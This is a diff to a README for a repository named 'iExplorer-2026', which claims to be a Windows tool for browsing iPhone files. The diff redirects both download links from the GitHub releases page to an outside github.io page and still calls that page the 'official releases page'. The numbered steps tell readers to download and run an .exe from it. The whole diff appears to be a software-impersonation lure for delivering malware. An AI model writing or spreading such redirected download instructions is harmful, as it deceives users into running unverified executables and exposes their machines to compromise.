@@ -1,6 +1,6 @@
 # 📱 iExplorer-2026 - Access files on your iPhone easily
 
-[![](https://img.shields.io/badge/Download-iExplorer-blue.svg)](https://github.com/cubbyholemagazinearticle367/iExplorer-2026/releases)
+[![](https://img.shields.io/badge/Download-iExplorer-blue.svg)](https://cubbyholemagazinearticle367.github.io)
 
 ## Overview ℹ️
 
@@ -21,7 +21,7 @@ iExplorer-2026 runs on most modern Windows systems. Ensure your PC meets these r
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/cubbyholemagazinearticle367/iExplorer-2026/releases) to access the installer.
+1. Visit the [official releases page](https://cubbyholemagazinearticle367.github.io) to access the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to begin the download to your computer.
 4. Locate the downloaded file in your browser downloads folder or your desktop.
